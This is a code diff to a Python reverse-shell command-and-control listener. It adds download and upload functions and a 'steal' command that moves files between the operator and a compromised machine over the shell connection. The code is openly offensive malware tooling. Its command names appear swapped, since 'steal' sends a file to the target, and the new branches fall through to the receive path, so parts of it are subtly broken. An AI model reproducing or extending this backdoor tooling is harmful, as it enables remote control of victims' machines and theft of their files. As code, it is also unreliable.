@@ -39,6 +39,23 @@ def handle_connection(s):
     target, ip = s.accept()
     print(f"[+] Started new communication with {ip}")
     communicate(target, ip)
+
+def download(target, file_name):
+    f = open(file_name, "wb")
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout:
+            break
+    target.settimeout(None)
+    f.close()
+
+def upload(target, file_name):
+    f = open(file_name, "rb")
+    target.send(f.read())
 def communicate(target, ip):
     while(True):
         command = input("shell~%s" % str(ip))
@@ -49,6 +66,10 @@ def communicate(target, ip):
             pass
         if command == "clear":
             os.system('cls||clear')
+        if command[:5] == "steal":
+            upload(target, command[5:])
+        if command[:6] == "upload":
+            download(target, command[6:])
         else:
             result = reliable_receive(target)
             print(result)
